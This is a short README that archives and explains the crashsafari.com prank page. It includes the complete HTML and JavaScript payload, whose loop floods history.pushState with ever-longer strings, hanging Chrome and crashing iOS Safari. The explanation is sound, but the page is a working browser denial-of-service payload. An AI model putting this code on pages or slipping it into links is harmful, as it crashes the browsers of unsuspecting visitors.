# crashsafari


This readme contains the code from `crashsafari.com`. For obvious reasons there are no links to the site. I am not the original author of the site.


## Results

Visiting `crashsafari.com` causes the browser to hang on Chrome, and crash on iOS Safari.

## Explanation

The code exploits the [HTML5 pushState](https://developer.mozilla.org/en-US/docs/Web/API/History_API) API used on all modern browsers to update the path of the site you are visiting during JavaScript page navigation.


Instead of just changing the path from ex. `example.com/pageone` to `example.com/pagetwo` it creates a string of numbers long enough to either slow the browser until it won't function, or crash.

## Code

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>What were you expecting?</h1>
    <script>
      var total = "";
      for( var i = 0; i < 100000; i++ ) {
          total = total + i.toString();
          history.pushState(0,0, total );
      }
    </script>
  </body>
</html>
```


License [MIT](LICENSE)

Original code taken from `http://crashsafari.com`

(I am not responsible for whatever is done with this, etc)
